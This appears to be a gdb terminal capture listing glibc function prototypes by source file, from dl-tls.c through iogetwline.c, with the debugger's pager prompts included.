void *_dl_allocate_tls_storage(void);
size_t _dl_count_modids(void);
void _dl_determine_tlsoffset(void);
void _dl_get_tls_static_info(size_t *, size_t *);
size_t _dl_next_tls_modid(void);
void *_dl_tls_get_addr_soft(struct link_map *);
struct link_map *_dl_update_slotinfo(unsigned long);
static dtv_t *_dl_resize_dtv(dtv_t *);
static void oom(void);
static void *tls_get_addr_tail(tls_index *, dtv_t *, struct link_map *);
static struct link_map *update_get_addr(tls_index *);

File dl-tsd.c:
void **__libc_dl_error_tsd(void);

File dl-version.c:
int _dl_check_all_versions(struct link_map *, int, int);
int _dl_check_map_versions(struct link_map *, int, int);



static int match_symbol(const char *, Lmid_t, Elf64_Word, const char *, struct link_map *, int, int);

File dngettext.c:
char *__dngettext(const char *, const char *, const char *, unsigned long);

File dprintf.c:
int __GI___dprintf(int, const char *, ...);

File dprintf_chk.c:
int __dprintf_chk(int, int, const char *, ...);
---Type <return> to continue, or q <return> to quit---

File drand48-iter.c:
int __drand48_iterate(unsigned short *, struct drand48_data *);


File drand48.c:
double drand48(void);

File drand48_r.c:
int drand48_r(struct drand48_data *, double *);

File duplocale.c:
__locale_t __duplocale(__locale_t);

File dysize.c:
int dysize(int);

File efgcvt.c:
char *__ecvt(double, int, int *, int *);
char *__fcvt(double, int, int *, int *);
char *__gcvt(double, int, char *);
char *__qecvt(long double, int, int *, int *);
char *__qfcvt(long double, int, int *, int *);
char *__qgcvt(long double, int, char *);

File efgcvt_r.c:
int __ecvt_r(double, int, int *, int *, char *, size_t);
int __fcvt_r(double, int, int *, int *, char *, size_t);
int __qecvt_r(long double, int, int *, int *, char *, size_t);
int __qfcvt_r(long double, int, int *, int *, char *, size_t);

File endutxent.c:
void endutxent(void);

File envz.c:
char *__GI_envz_entry(const char *, size_t, const char *);
void __GI_envz_remove(char **, size_t *, const char *);
error_t envz_add(char **, size_t *, const char *, const char *);
char *envz_get(const char *, size_t, const char *);
error_t envz_merge(char **, size_t *, const char *, size_t, int);
void envz_strip(char **, size_t *);
---Type <return> to continue, or q <return> to quit---

File era.c:
struct era_entry *_nl_get_era_entry(const struct tm *, struct __locale_data *);
struct era_entry *_nl_select_era_entry(int, struct __locale_data *);
static void _nl_init_era_entries(struct __locale_data *);

File erand48.c:
double erand48(unsigned short *);

File erand48_r.c:
int __erand48_r(unsigned short *, struct drand48_data *, double *);

File err.c:
void __GI_verr(int, const char *, struct __va_list_tag *);
void __GI_verrx(int, const char *, struct __va_list_tag *);
void __GI_vwarn(const char *, struct __va_list_tag *);
void __GI_vwarnx(const char *, struct __va_list_tag *);
void __GI_warn(const char *, ...);
void __GI_warnx(const char *, ...);
void err(int, const char *, ...);
void errx(int, const char *, ...);
static void convert_and_print(const char *, struct __va_list_tag *);

File errno-loc.c:
int *__GI___errno_location(void);

File error.c:
void __error(int, int, const char *, ...);
void __error_at_line(int, int, const char *, unsigned int, const char *, ...);
static void error_tail(int, int, const char *, struct __va_list_tag *);
static void print_errno_message(int);

File ether_aton.c:
struct ether_addr *ether_aton(const char *);


File ether_aton_r.c:
struct ether_addr *__GI_ether_aton_r(const char *, struct ether_addr *);

File ether_hton.c:
int ether_hostton(const char *, struct ether_addr *);
---Type <return> to continue, or q <return> to quit---

File ether_line.c:
int ether_line(const char *, struct ether_addr *, char *);

File ether_ntoa.c:
char *ether_ntoa(const struct ether_addr *);

File ether_ntoa_r.c:
char *__GI_ether_ntoa_r(const struct ether_addr *, char *);

File ether_ntoh.c:
int ether_ntohost(char *, const struct ether_addr *);

File eval-plural.h:
static unsigned long plural_eval(const struct expression *, unsigned long);

File execl.c:
int __GI_execl(const char *, const char *, ...);

File execle.c:
int __GI_execle(const char *, const char *, ...);

File execlp.c:
int __GI_execlp(const char *, const char *, ...);

File execv.c:
int execv(const char *, char * const *);

File execvp.c:
int __GI_execvp(const char *, char * const *);

File execvpe.c:
int __execvpe(const char *, char * const *, char * const *);

File exit.c:
void __GI_exit(int);
void __run_exit_handlers(int, struct exit_function_list **, _Bool);

File explodename.c:
int _nl_explode_name(char *, const char **, const char **, const char **, const char **, const char **);
---Type <return> to continue, or q <return> to quit---

File fattach.c:
int fattach(int, const char *);

File fchflags.c:
int fchflags(int, unsigned long);

File fcloseall.c:
int __fcloseall(void);

File fdelt_chk.c:
long __fdelt_chk(long);

File fdetach.c:
int fdetach(const char *);

File feof.c:
int _IO_feof(_IO_FILE *);

File feof_u.c:
int feof_unlocked(_IO_FILE *);

File ferror.c:
int _IO_ferror(_IO_FILE *);

File ferror_u.c:
int ferror_unlocked(_IO_FILE *);

File fgetgrent.c:
struct group *fgetgrent(FILE *);

File fgetgrent_r.c:

int __GI__nss_files_parse_grent(char *, struct group *, struct parser_data *, size_t, int *);
int __fgetgrent_r(FILE *, struct group *, char *, size_t, struct group **);

File fgetpwent.c:
struct passwd *fgetpwent(FILE *);

File fgetpwent_r.c:
int __GI__nss_files_parse_pwent(char *, struct passwd *, struct parser_data *, size_t, int *);
---Type <return> to continue, or q <return> to quit---
int __fgetpwent_r(FILE *, struct passwd *, char *, size_t, struct passwd **);

File fgets_chk.c:
char *__fgets_chk(char *, size_t, int, _IO_FILE *);

File fgets_u_chk.c:
char *__fgets_unlocked_chk(char *, size_t, int, _IO_FILE *);

File fgetsgent.c:
struct sgrp *fgetsgent(FILE *);

File fgetsgent_r.c:
int __fgetsgent_r(FILE *, struct sgrp *, char *, size_t, struct sgrp **);

File fgetspent.c:
struct spwd *fgetspent(FILE *);

File fgetspent_r.c:
int __fgetspent_r(FILE *, struct spwd *, char *, size_t, struct spwd **);

File fgetws_chk.c:
wchar_t *__fgetws_chk(wchar_t *, size_t, int, _IO_FILE *);

File fgetws_u_chk.c:
wchar_t *__fgetws_unlocked_chk(wchar_t *, size_t, int, _IO_FILE *);

File filedoalloc.c:
int __GI__IO_file_doallocate(_IO_FILE *);

File fileno.c:
int __GI___fileno(_IO_FILE *);

File fileops.c:
int _IO_file_close_mmap(_IO_FILE *);
__off64_t _IO_file_seekoff_mmap(_IO_FILE *, __off64_t, int, int);
_IO_FILE *_IO_file_setbuf_mmap(_IO_FILE *, char *, __ssize_t);
int _IO_file_underflow_maybe_mmap(_IO_FILE *);
int _IO_file_underflow_mmap(_IO_FILE *);
int _IO_new_do_write(_IO_FILE *, const char *, size_t);
_IO_FILE *_IO_new_file_attach(_IO_FILE *, int);
---Type <return> to continue, or q <return> to quit---
int _IO_new_file_close_it(_IO_FILE *);
void _IO_new_file_finish(_IO_FILE *, int);
_IO_FILE *_IO_new_file_fopen(_IO_FILE *, const char *, const char *, int);

void _IO_new_file_init(struct _IO_FILE_plus *);
int _IO_new_file_overflow(_IO_FILE *, int);
__off64_t _IO_new_file_seekoff(_IO_FILE *, __off64_t, int, int);
_IO_FILE *_IO_new_file_setbuf(_IO_FILE *, char *, __ssize_t);
int _IO_new_file_sync(_IO_FILE *);
int _IO_new_file_underflow(_IO_FILE *);
__ssize_t _IO_new_file_write(_IO_FILE *, const void *, __ssize_t);
size_t _IO_new_file_xsputn(_IO_FILE *, const void *, size_t);
int __GI__IO_file_close(_IO_FILE *);
_IO_FILE *__GI__IO_file_open(_IO_FILE *, const char *, int, int, int, int);
__ssize_t __GI__IO_file_read(_IO_FILE *, void *, __ssize_t);
__off64_t __GI__IO_file_seek(_IO_FILE *, __off64_t, int);
int __GI__IO_file_stat(_IO_FILE *, void *);
size_t __GI__IO_file_xsgetn(_IO_FILE *, void *, size_t);
static __off64_t _IO_file_seekoff_maybe_mmap(_IO_FILE *, __off64_t, int, int);
static int _IO_file_sync_mmap(_IO_FILE *);
static size_t _IO_file_xsgetn_maybe_mmap(_IO_FILE *, void *, size_t);
static size_t _IO_file_xsgetn_mmap(_IO_FILE *, void *, size_t);

File finddomain.c:
struct loaded_l10nfile *_nl_find_domain(const char *, char *, const char *, struct binding *);
void _nl_finddomain_subfreeres(void);

File findlocale.c:
struct __locale_data *_nl_find_locale(const char *, size_t, int, const char **);
void _nl_remove_locale(int, struct __locale_data *);

File fmemopen.c:
FILE *__GI___fmemopen(void *, size_t, const char *);
static int fmemopen_close(void *);
static ssize_t fmemopen_read(void *, char *, size_t);
static int fmemopen_seek(void *, __off64_t *, int);
static ssize_t fmemopen_write(void *, const char *, size_t);

File fmtmsg.c:
int __addseverity(int, const char *);
int fmtmsg(long, const char *, int, const char *, const char *, const char *);
---Type <return> to continue, or q <return> to quit---
static void free_mem(void);
static void init(void);

File fnmatch.c:
int __fnmatch(const char *, const char *, int);

File fnmatch_loop.c:
static const char *end_pattern(const char *);
static const wchar_t *end_wpattern(const wchar_t *);
static int ext_match(int, const char *, const char *, const char *, int, int, size_t);
static int ext_wmatch(wint_t, const wchar_t *, const wchar_t *, const wchar_t *, int, int, size_t);
static int internal_fnmatch(const char *, const char *, const char *, int, int, struct fnmatch_struct *, size_t);

static int internal_fnwmatch(const wchar_t *, const wchar_t *, const wchar_t *, int, int, struct fnwmatch_struct *, size_t);

File fortify_fail.c:
void __GI___fortify_fail(const char *);

File forward.c:
int __pthread_attr_init_2_1(pthread_attr_t *);
int __pthread_cond_broadcast(pthread_cond_t *);
int __pthread_cond_broadcast_2_0(pthread_cond_2_0_t *);
int __pthread_cond_destroy(pthread_cond_t *);
int __pthread_cond_destroy_2_0(pthread_cond_2_0_t *);
int __pthread_cond_init(pthread_cond_t *, const pthread_condattr_t *);
int __pthread_cond_init_2_0(pthread_cond_2_0_t *, const pthread_condattr_t *);
int __pthread_cond_signal(pthread_cond_t *);
int __pthread_cond_signal_2_0(pthread_cond_2_0_t *);
int __pthread_cond_timedwait(pthread_cond_t *, pthread_mutex_t *, const struct timespec *);
int __pthread_cond_timedwait_2_0(pthread_cond_2_0_t *, pthread_mutex_t *, const struct timespec *);
int __pthread_cond_wait(pthread_cond_t *, pthread_mutex_t *);
int __pthread_cond_wait_2_0(pthread_cond_2_0_t *, pthread_mutex_t *);
void __pthread_exit(void *);
int __pthread_setcancelstate(int, int *);

void __pthread_unwind(__pthread_unwind_buf_t *);
int pthread_attr_destroy(pthread_attr_t *);
int pthread_attr_getdetachstate(const pthread_attr_t *, int *);
int pthread_attr_getinheritsched(const pthread_attr_t *, int *);
int pthread_attr_getschedparam(const pthread_attr_t *, struct sched_param *);
int pthread_attr_getschedpolicy(const pthread_attr_t *, int *);
int pthread_attr_getscope(const pthread_attr_t *, int *);
---Type <return> to continue, or q <return> to quit---
int pthread_attr_setdetachstate(pthread_attr_t *, int);
int pthread_attr_setinheritsched(pthread_attr_t *, int);
int pthread_attr_setschedparam(pthread_attr_t *, const struct sched_param *);
int pthread_attr_setschedpolicy(pthread_attr_t *, int);
int pthread_attr_setscope(pthread_attr_t *, int);
int pthread_condattr_destroy(pthread_condattr_t *);
int pthread_condattr_init(pthread_condattr_t *);

int pthread_equal(pthread_t, pthread_t);
int pthread_getschedparam(pthread_t, int *, struct sched_param *);
int pthread_mutex_destroy(pthread_mutex_t *);
int pthread_mutex_init(pthread_mutex_t *, const pthread_mutexattr_t *);
int pthread_mutex_lock(pthread_mutex_t *);
int pthread_mutex_unlock(pthread_mutex_t *);
pthread_t pthread_self(void);
int pthread_setcanceltype(int, int *);
int pthread_setschedparam(pthread_t, int, const struct sched_param *);

File fprintf.c:
int __fprintf(FILE *, const char *, ...);

File fprintf_chk.c:
int ___fprintf_chk(FILE *, int, const char *, ...);

File fputc.c:
int fputc(int, _IO_FILE *);

File fputc_u.c:
int fputc_unlocked(int, _IO_FILE *);

File fputwc.c:
wint_t fputwc(wchar_t, _IO_FILE *);

File fputwc_u.c:
wint_t fputwc_unlocked(wchar_t, _IO_FILE *);

File fread_chk.c:
size_t __fread_chk(void * restrict, size_t, size_t, size_t, FILE * restrict);

File fread_u_chk.c:
size_t __fread_unlocked_chk(void * restrict, size_t, size_t, size_t, FILE * restrict);
---Type <return> to continue, or q <return> to quit---

File freelocale.c:
void __freelocale(__locale_t);

File freopen.c:
FILE *freopen(const char *, const char *, FILE *);

File freopen64.c:
FILE *freopen64(const char *, const char *, FILE *);

File fscanf.c:
int __fscanf(FILE *, const char *, ...);

File fseek.c:
int __GI_fseek(_IO_FILE *, long, int);

File fseeko.c:
int fseeko(_IO_FILE *, off_t, int);

File fstab.c:
void endfsent(void);
struct fstab *getfsent(void);

struct fstab *getfsfile(const char *);
struct fstab *getfsspec(const char *);
int setfsent(void);
static void fstab_free(void);

File ftello.c:
off_t __GI___ftello(_IO_FILE *);

File ftok.c:
key_t ftok(const char *, int);

File fwide.c:
int fwide(_IO_FILE *, int);

File fwprintf.c:
int __fwprintf(FILE *, const wchar_t *, ...);

File fwprintf_chk.c:
---Type <return> to continue, or q <return> to quit---
int __fwprintf_chk(FILE *, int, const wchar_t *, ...);

File fwscanf.c:
int __fwscanf(FILE *, const wchar_t *, ...);

File fxprintf.c:
int __fxprintf(FILE *, const char *, ...);

File gconv.c:
int __gconv(__gconv_t, const unsigned char **, const unsigned char *, unsigned char **, unsigned char *, size_t *);

File gconv_builtin.c:
void __gconv_get_builtin_trans(const char *, struct __gconv_step *);

File gconv_cache.c:
int __gconv_compare_alias_cache(const char *, const char *, int *);
void *__gconv_get_cache(void);
int __gconv_load_cache(void);
int __gconv_lookup_cache(const char *, const char *, struct __gconv_step **, size_t *, int);
void __gconv_release_cache(struct __gconv_step *, size_t);
static int find_module(const char *, const char *, struct __gconv_step *);
static void free_mem(void);

File gconv_close.c:
int __gconv_close(__gconv_t);

File gconv_conf.c:
void __gconv_get_path(void);
void __gconv_read_conf(void);
static void add_module(char *, const char *, size_t, int, size_t *, void **);
static void free_mem(void);
static void insert_module(struct gconv_module *, int);


File gconv_db.c:
int __gconv_alias_compare(const void *, const void *);
int __gconv_close_transform(struct __gconv_step *, size_t);
int __gconv_compare_alias(const char *, const char *);
int __gconv_find_transform(const char *, const char *, struct __gconv_step **, size_t *, int);
void *__gconv_get_alias_db(void);
struct gconv_module *__gconv_get_modules_db(void);
---Type <return> to continue, or q <return> to quit---
void __gconv_release_step(struct __gconv_step *);
static int derivation_compare(const void *, const void *);
static int find_derivation(const char *, const char *, const char *, const char *, struct __gconv_step **, size_t *);
static void free_derivation(void *);
static void free_mem(void);
static void free_modules_db(struct gconv_module *);

File gconv_dl.c:
struct __gconv_loaded_object *__gconv_find_shlib(const char *);
void __gconv_release_shlib(struct __gconv_loaded_object *);
static void do_release_all(void *);
static void do_release_shlib(void *, VISIT, int);
static void free_mem(void);
static int known_compare(const void *, const void *);

File gconv_open.c:
int __gconv_open(const char *, const char *, __gconv_t *, int);

File gconv_simple.c:
wint_t __gconv_btwoc_ascii(struct __gconv_step *, unsigned char);

File gconv_trans.c:
int __GI___gconv_transliterate(struct __gconv_step *, struct __gconv_step_data *, const unsigned char *, const unsigned char **, 
    const unsigned char *, unsigned char **, size_t *);

File genops.c:
int _IO_cleanup(void);
void _IO_default_imbue(_IO_FILE *, void *);
__ssize_t _IO_default_read(_IO_FILE *, void *, __ssize_t);
__off64_t _IO_default_seek(_IO_FILE *, __off64_t, int);
__off64_t _IO_default_seekoff(_IO_FILE *, __off64_t, int, int);
__off64_t _IO_default_seekpos(_IO_FILE *, __off64_t, int);
_IO_FILE *_IO_default_setbuf(_IO_FILE *, char *, __ssize_t);
int _IO_default_showmanyc(_IO_FILE *);
int _IO_default_stat(_IO_FILE *, void *);
int _IO_default_sync(_IO_FILE *);
__ssize_t _IO_default_write(_IO_FILE *, const void *, __ssize_t);
int _IO_flush_all_lockp(int);
void _IO_init_marker(struct _IO_marker *, _IO_FILE *);

__ssize_t _IO_least_marker(_IO_FILE *, char *);
---Type <return> to continue, or q <return> to quit---
int _IO_marker_delta(struct _IO_marker *);
int _IO_marker_difference(struct _IO_marker *, struct _IO_marker *);
void _IO_no_init(_IO_FILE *, int, int, struct _IO_wide_data *, const struct _IO_jump_t *);
void _IO_old_init(_IO_FILE *, int);
void _IO_remove_marker(struct _IO_marker *);
int _IO_seekmark(_IO_FILE *, struct _IO_marker *, int);
int _IO_sungetc(_IO_FILE *);
void _IO_switch_to_backup_area(_IO_FILE *);
void _IO_switch_to_main_get_area(_IO_FILE *);
unsigned int __GI__IO_adjust_column(unsigned int, const char *, int);
int __GI__IO_default_doallocate(_IO_FILE *);
void __GI__IO_default_finish(_IO_FILE *, int);
int __GI__IO_default_pbackfail(_IO_FILE *, int);
int __GI__IO_default_uflow(_IO_FILE *);

size_t __GI__IO_default_xsgetn(_IO_FILE *, void *, size_t);
size_t __GI__IO_default_xsputn(_IO_FILE *, const void *, size_t);
void __GI__IO_doallocbuf(_IO_FILE *);
int __GI__IO_flush_all(void);
void __GI__IO_flush_all_linebuffered(void);
void __GI__IO_free_backup_area(_IO_FILE *);
void __GI__IO_init(_IO_FILE *, int);
_IO_ITER __GI__IO_iter_begin(void);
_IO_ITER __GI__IO_iter_end(void);
_IO_FILE *__GI__IO_iter_file(_IO_ITER);
_IO_ITER __GI__IO_iter_next(_IO_ITER);
void __GI__IO_link_in(struct _IO_FILE_plus *);
void __GI__IO_list_lock(void);
void __GI__IO_list_resetlock(void);
void __GI__IO_list_unlock(void);
void __GI__IO_setb(_IO_FILE *, char *, char *, int);
size_t __GI__IO_sgetn(_IO_FILE *, void *, size_t);
int __GI__IO_sputbackc(_IO_FILE *, int);
int __GI__IO_switch_to_get_mode(_IO_FILE *);
void __GI__IO_un_link(struct _IO_FILE_plus *);
void __GI__IO_unsave_markers(_IO_FILE *);
int __GI___overflow(_IO_FILE *, int);
int __GI___uflow(_IO_FILE *);
int __GI___underflow(_IO_FILE *);
static void buffer_free(void);
static void flush_cleanup(void *);
---Type <return> to continue, or q <return> to quit---
static int save_for_backup(_IO_FILE *, char *);

File get_myaddr.c:
void __GI_get_myaddress(struct sockaddr_in *);

File getauxval.c:
unsigned long __getauxval(unsigned long);

File getc.c:
int _IO_getc(FILE *);

File getc_u.c:
int __getc_unlocked(FILE *);

File getchar.c:
int getchar(void);

File getchar_u.c:
int getchar_unlocked(void);

File getcwd_chk.c:
char *__getcwd_chk(char *, size_t, size_t);

File getdate.c:
int __getdate_r(const char *, struct tm *);
struct tm *getdate(const char *);

File getdirname.c:
char *get_current_dir_name(void);

File getdomain.c:
int __GI_getdomainname(char *, size_t);

File getdomainname_chk.c:
int __getdomainname_chk(char *, size_t, size_t);

File getenv.c:
char *__GI_getenv(const char *);

File getgroups_chk.c:
---Type <return> to continue, or q <return> to quit---
int __getgroups_chk(int, __gid_t *, size_t);

File gethostname_chk.c:
int __gethostname_chk(char *, size_t, size_t);

File getline.c:
__ssize_t __getline(char **, size_t *, FILE *);

File getlogin_r_chk.c:
int __getlogin_r_chk(char *, size_t, size_t);

File getmsg.c:

int getmsg(int, struct strbuf *, struct strbuf *, int *);

File getnameinfo.c:
int __GI_getnameinfo(const struct sockaddr *, socklen_t, char *, socklen_t, char *, socklen_t, int);
static int gni_host_inet_name(struct scratch_buffer *, const struct sockaddr *, char *, socklen_t, int, socklen_t);
static char *nrl_domainname(void);

File getnetgrent.c:
int getnetgrent(char **, char **, char **);
static void allocate(void);

File getnetgrent_r.c:
void __GI___internal_endnetgrent(struct __netgrent *);
int __GI___internal_getnetgrent_r(char **, char **, char **, struct __netgrent *, char *, size_t, int *);
int __GI___internal_setnetgrent(const char *, struct __netgrent *);
int __GI_innetgr(const char *, const char *, const char *, const char *);
int __getnetgrent_r(char **, char **, char **, char *, size_t);
void endnetgrent(void);
int setnetgrent(const char *);
static int __internal_setnetgrent_reuse(const char *, struct __netgrent *, int *);
static enum nss_status nscd_getnetgrent(struct __netgrent *, char *, size_t, int *);


File getnssent.c:
void *__nss_getent(getent_r_function, void **, char **, size_t, size_t *, int *);

File getnssent_r.c:
void __nss_endent(const char *, db_lookup_function, service_user **, service_user **, service_user **, int);
int __nss_getent_r(const char *, const char *, db_lookup_function, service_user **, service_user **, service_user **, int *, int, 
---Type <return> to continue, or q <return> to quit---
    void *, char *, size_t, void **, int *);
void __nss_setent(const char *, db_lookup_function, service_user **, service_user **, service_user **, int, int *, int);

File getopt.c:
int __posix_getopt(int, char * const *, const char *);
int _getopt_internal(int, char * const *, const char *, const struct option *, int *, int, int);

int _getopt_internal_r(int, char * const *, const char *, const struct option *, int *, int, struct _getopt_data *, int);
int getopt(int, char * const *, const char *);
static void exchange(char **, struct _getopt_data *);

File getopt1.c:
int _getopt_long_only_r(int, char * const *, const char *, const struct option *, int *, struct _getopt_data *);
int _getopt_long_r(int, char * const *, const char *, const struct option *, int *, struct _getopt_data *);
int getopt_long(int, char * const *, const char *, const struct option *, int *);
int getopt_long_only(int, char * const *, const char *, const struct option *, int *);

File getpass.c:
char *getpass(const char *);

File getpw.c:
int __getpw(__uid_t, char *);

File getrpcport.c:
int getrpcport(const char *, u_long, u_long, u_int);

File gets_chk.c:
char *__gets_chk(char *, size_t);

File getsubopt.c:
int getsubopt(char **, char * const *, char **);

File gettext.c:
char *__gettext(const char *);

File getttyent.c:
int __GI___endttyent(void);
struct ttyent *__GI___getttyent(void);
int __GI___setttyent(void);
struct ttyent *__getttynam(const char *);
static char *skip(char *);

---Type <return> to continue, or q <return> to quit---

File getusershell.c:
void endusershell(void);
char *getusershell(void);
void setusershell(void);
static char **initshells(void);

File getutent.c:
struct utmp *__getutent(void);

File getutent_r.c:
void __endutent(void);
int __getutent_r(struct utmp *, struct utmp **);
struct utmp *__pututline(const struct utmp *);
void __setutent(void);
static void endutent_unknown(void);
static int getutent_r_unknown(struct utmp *, struct utmp **);
static int getutid_r_unknown(const struct utmp *, struct utmp *, struct utmp **);
static int getutline_r_unknown(const struct utmp *, struct utmp *, struct utmp **);
static struct utmp *pututline_unknown(const struct utmp *);
static int setutent_unknown(void);

File getutid.c:
struct utmp *__getutid(const struct utmp *);

File getutid_r.c:
int __getutid_r(const struct utmp *, struct utmp *, struct utmp **);

File getutline.c:
struct utmp *__getutline(const struct utmp *);

File getutline_r.c:
int __getutline_r(const struct utmp *, struct utmp *, struct utmp **);

File getutxent.c:
struct utmpx *getutxent(void);

File getutxid.c:
struct utmpx *getutxid(const struct utmpx *);

---Type <return> to continue, or q <return> to quit---
File getutxline.c:
struct utmpx *getutxline(const struct utmpx *);

File getw.c:
int getw(FILE *);

File getwc.c:
wint_t _IO_getwc(FILE *);

File getwc_u.c:
wint_t __getwc_unlocked(FILE *);

File getwchar.c:
wint_t getwchar(void);

File getwchar_u.c:
wint_t getwchar_unlocked(void);

File getwd.c:
char *getwd(char *);

File getwd_chk.c:
char *__getwd_chk(char *, size_t);

File gmon.c:
void __moncontrol(int);
void __monstartup(u_long, u_long);
void __write_profiling(void);
void _mcleanup(void);
static void write_gmon(void);

File gmtime.c:
struct tm *__GI___gmtime_r(const time_t *, struct tm *);
struct tm *gmtime(const time_t *);

File group_member.c:
int __group_member(gid_t);

File grouping.c:
const char *__correctly_grouped_prefixmb(const char *, const char *, const char *, const char *);
---Type <return> to continue, or q <return> to quit---
const wchar_t *__correctly_grouped_prefixwc(const wchar_t *, const wchar_t *, wchar_t, const char *);

File gtty.c:
int gtty(int, struct sgttyb *);

File hash-string.c:
unsigned long __hash_string(const char *);

File herrno-loc.c:
int *__GI___h_errno_location(void);

File herror.c:
const char *__GI_hstrerror(int);
void herror(const char *);

File hooks.c:
void __malloc_check_init(void);
void *__malloc_get_state(void);
int __malloc_set_state(void *);
static void free_check(void *, const void *);
static void *malloc_check(size_t, const void *);
static void *malloc_hook_ini(size_t, const void *);
static void *memalign_check(size_t, size_t, const void *);
static void *memalign_hook_ini(size_t, size_t, const void *);
static void *realloc_check(void *, size_t, const void *);
static void *realloc_hook_ini(void *, size_t, const void *);
static int top_check(void);

File hsearch.c:
void __hdestroy(void);
int hcreate(size_t);
ENTRY *hsearch(ENTRY, ACTION);

File hsearch_r.c:
int __GI___hcreate_r(size_t, struct hsearch_data *);
void __GI___hdestroy_r(struct hsearch_data *);
int __GI___hsearch_r(ENTRY, ACTION, ENTRY **, struct hsearch_data *);

File htons.c:
uint16_t htons(uint16_t);
---Type <return> to continue, or q <return> to quit---

File iconv.c:

size_t iconv(iconv_t, char **, size_t *, char **, size_t *);

File iconv_close.c:
int iconv_close(iconv_t);

File iconv_open.c:
iconv_t iconv_open(const char *, const char *);

File idn-stub.c:
int __idna_to_ascii_lz(const char *, char **, int);
int __idna_to_unicode_lzlz(const char *, char **, int);
static void load_dso(void);
static void unload_libidn(void);

File inet6_opt.c:
int inet6_opt_append(void *, socklen_t, int, uint8_t, socklen_t, uint8_t, void **);
int inet6_opt_find(void *, socklen_t, int, uint8_t, socklen_t *, void **);
int inet6_opt_finish(void *, socklen_t, int);
int inet6_opt_get_val(void *, int, void *, socklen_t);
int inet6_opt_init(void *, socklen_t);
int inet6_opt_next(void *, socklen_t, int, uint8_t *, socklen_t *, void **);
int inet6_opt_set_val(void *, int, void *, socklen_t);

File inet6_option.c:
uint8_t *inet6_option_alloc(struct cmsghdr *, int, int, int);
int inet6_option_append(struct cmsghdr *, const uint8_t *, int, int);
int inet6_option_find(const struct cmsghdr *, uint8_t **, int);
int inet6_option_init(void *, struct cmsghdr **, int);
int inet6_option_next(const struct cmsghdr *, uint8_t **);
int inet6_option_space(int);

File inet6_rth.c:
int inet6_rth_add(void *, const struct in6_addr *);
struct in6_addr *inet6_rth_getaddr(const void *, int);
void *inet6_rth_init(void *, socklen_t, int, int);
int inet6_rth_reverse(const void *, void *);
int inet6_rth_segments(const void *);
socklen_t inet6_rth_space(int, int);
---Type <return> to continue, or q <return> to quit---

File inet_addr.c:
int __GI___inet_aton(const char *, struct in_addr *);
in_addr_t __inet_addr(const char *);


File inet_lnaof.c:
in_addr_t inet_lnaof(struct in_addr);

File inet_mkadr.c:
struct in_addr __GI___inet_makeaddr(in_addr_t, in_addr_t);

File inet_net.c:
u_int32_t inet_network(const char *);

File inet_netof.c:
in_addr_t __GI_inet_netof(struct in_addr);

File inet_ntoa.c:
char *inet_ntoa(struct in_addr);

File inet_ntop.c:
const char *__GI_inet_ntop(int, const void *, char *, socklen_t);

File inet_pton.c:
int __GI___inet_pton(int, const char *, void *);

File init-misc.c:
void __init_misc(int, char **, char **);

File initgroups.c:
int getgrouplist(const char *, gid_t, gid_t *, int *);
int initgroups(const char *, gid_t);
static int internal_getgrouplist(const char *, gid_t, long *, gid_t **, long);

File insremque.c:
void insque(void *, void *);
void remque(void *);

File iofclose.c:
int _IO_new_fclose(_IO_FILE *);
---Type <return> to continue, or q <return> to quit---

File iofdopen.c:
_IO_FILE *_IO_new_fdopen(int, const char *);

File iofflush.c:
int __GI__IO_fflush(_IO_FILE *);

File iofflush_u.c:
int __GI___fflush_unlocked(_IO_FILE *);

File iofgetpos.c:
int _IO_new_fgetpos(_IO_FILE *, _G_fpos_t *);

File iofgets.c:
char *_IO_fgets(char *, int, _IO_FILE *);

File iofgets_u.c:
char *__GI___fgets_unlocked(char *, int, _IO_FILE *);

File iofgetws.c:
wchar_t *fgetws(wchar_t *, int, _IO_FILE *);

File iofgetws_u.c:
wchar_t *fgetws_unlocked(wchar_t *, int, _IO_FILE *);

File iofopen.c:
_IO_FILE *_IO_new_fopen(const char *, const char *);
_IO_FILE *__fopen_internal(const char *, const char *, int);
_IO_FILE *__fopen_maybe_mmap(_IO_FILE *);

File iofopncook.c:
void _IO_cookie_init(struct _IO_cookie_file *, int, void *, _IO_cookie_io_functions_t);
_IO_FILE *_IO_fopencookie(void *, const char *, _IO_cookie_io_functions_t);
static int _IO_cookie_close(_IO_FILE *);
static __ssize_t _IO_cookie_read(_IO_FILE *, void *, __ssize_t);
static __off64_t _IO_cookie_seek(_IO_FILE *, __off64_t, int);
static __off64_t _IO_cookie_seekoff(_IO_FILE *, __off64_t, int, int);
static __ssize_t _IO_cookie_write(_IO_FILE *, const void *, __ssize_t);

File iofputs.c:
---Type <return> to continue, or q <return> to quit---
int __GI__IO_fputs(const char *, _IO_FILE *);

File iofputs_u.c:
int __GI___fputs_unlocked(const char *, _IO_FILE *);

File iofputws.c:
int fputws(const wchar_t *, _IO_FILE *);

File iofputws_u.c:
int __GI_fputws_unlocked(const wchar_t *, _IO_FILE *);

File iofread.c:
size_t __GI__IO_fread(void *, size_t, size_t, _IO_FILE *);

File iofread_u.c:
size_t __GI___fread_unlocked(void *, size_t, size_t, _IO_FILE *);

File iofsetpos.c:
int _IO_new_fsetpos(_IO_FILE *, const _G_fpos_t *);

File ioftell.c:
long __GI__IO_ftell(_IO_FILE *);

File iofwide.c:
int _IO_fwide(_IO_FILE *, int);
static int do_always_noconv(struct _IO_codecvt *);
static int do_encoding(struct _IO_codecvt *);

static enum __codecvt_result do_in(struct _IO_codecvt *, __mbstate_t *, const char *, const char *, const char **, wchar_t *, 
    wchar_t *, wchar_t **);
static int do_length(struct _IO_codecvt *, __mbstate_t *, const char *, const char *, size_t);
static int do_max_length(struct _IO_codecvt *);
static enum __codecvt_result do_out(struct _IO_codecvt *, __mbstate_t *, const wchar_t *, const wchar_t *, const wchar_t **, char *, 
    char *, char **);
static enum __codecvt_result do_unshift(struct _IO_codecvt *, __mbstate_t *, char *, char *, char **);

File iofwrite.c:
size_t __GI__IO_fwrite(const void *, size_t, size_t, _IO_FILE *);

File iofwrite_u.c:
size_t __GI_fwrite_unlocked(const void *, size_t, size_t, _IO_FILE *);
---Type <return> to continue, or q <return> to quit---

File iogetdelim.c:
__ssize_t _IO_getdelim(char **, size_t *, int, _IO_FILE *);

File iogetline.c:
size_t __GI__IO_getline(_IO_FILE *, char *, size_t, int, int);
size_t __GI__IO_getline_info(_IO_FILE *, char *, size_t, int, int, int *);

File iogets.c:
char *_IO_gets(char *);

File iogetwline.c:
size_t _IO_getwline(_IO_FILE *, wchar_t *, size_t, wint_t, int);
